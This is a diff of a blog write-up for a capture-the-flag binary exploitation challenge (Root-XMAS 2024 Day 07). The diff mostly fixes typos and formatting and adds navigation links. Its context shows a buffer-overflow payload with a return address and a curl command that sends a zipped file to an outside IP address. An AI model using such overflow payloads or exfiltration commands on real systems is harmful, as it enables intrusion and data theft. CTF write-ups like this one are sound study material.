@@ -1,6 +1,6 @@
 ---
 title: Root-XMAS 2024 Day 07 - Go, Pwn, Gown
-feed: show
+feed: hide
 permalink: /RootXMAS_2024_07
 date: 07-12-2024
 summary: where bash is harder than pwn.
@@ -102,7 +102,7 @@ app ./gown
 First problem: we overwrite the `RBP` register, but not  `RIP`. What is this trickery?
 Thankfully the  [ired-team blog on 64-bit buffer overflow](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow#why-is-rip-not-overflowed) gives us the solution on it's "Why is RIP not overflowed?" section:
 
-In x64, if `RIP` is assigned a too big value outside of the available memory range (capped at `0x00007FFFFFFFFFFF`) , then the register is left unmodified.
+> In x64, if `RIP` is assigned a too big value outside of the available memory range (capped at `0x00007FFFFFFFFFFF`) , then the register is left unmodified.
 
 So let's  ~~do aclever or automated analysis of the registries offset~~  Totally guess the offset by trial and error by randomly removing characters from our payload.
 
@@ -136,7 +136,7 @@ b laluBackdoor
 	Breakpoint 1 at 0x61eb95 # !! 4 bytes offset!
 ```
 
-> [!warning] warning
+> [!error] warning
 > gdb puts the breakpoint 4 bytes AFTER the real start of the method, which will leave you with a surprise (and lot of time loss ) if you don't know it!
 
 - Static analysis with Ghidra or Objdump.
@@ -193,7 +193,7 @@ But was it?
 
 ### how to lose 5 hours with bash
 
-For whatever reason, during testing, I tought that I had to take care not overwriting the `RAX` register. Surely during my tests with GDB giving a 4 bytes shifted offset. 
+For whatever reason, during testing, I thought that I had to take care not overwriting the `RAX` register. Surely during my tests with GDB giving a 4 bytes shifted offset. 
 So I fixed my offset issue, but carried away this non-existing `RAX` constraint, meaning I had to create payload like this:
 
 ```bash
@@ -205,7 +205,7 @@ payloadwithpadding XXXXXX%01%00%00%00%00%00%00%00%00%00%91%EBa
 
 ```
 
-This additional constraint meaned my payload maximum size was reduced from **72** chars to **62** . And my `curl` payload was *over* 62 caracters...
+This additional constraint meant my payload maximum size was reduced from **72** chars to **62** . And my `curl` payload was *over* 62 characters...
 
 But thankfully we have multiple solutions to reduce the size of our payload!
 
@@ -290,3 +290,8 @@ curl --data-binary @/tmp/z.zip 88.165.169.180:49153 #
 ```
 
 Why do things the simple way when you can do it the insanely convoluted way?
+
+
+| Previous day | [[Day 06 - Unwrap The Gift]]    |
+| ------------ | ------------------------------- |
+| Next day     | [[Day 08 - Custom HTTP Server]] |
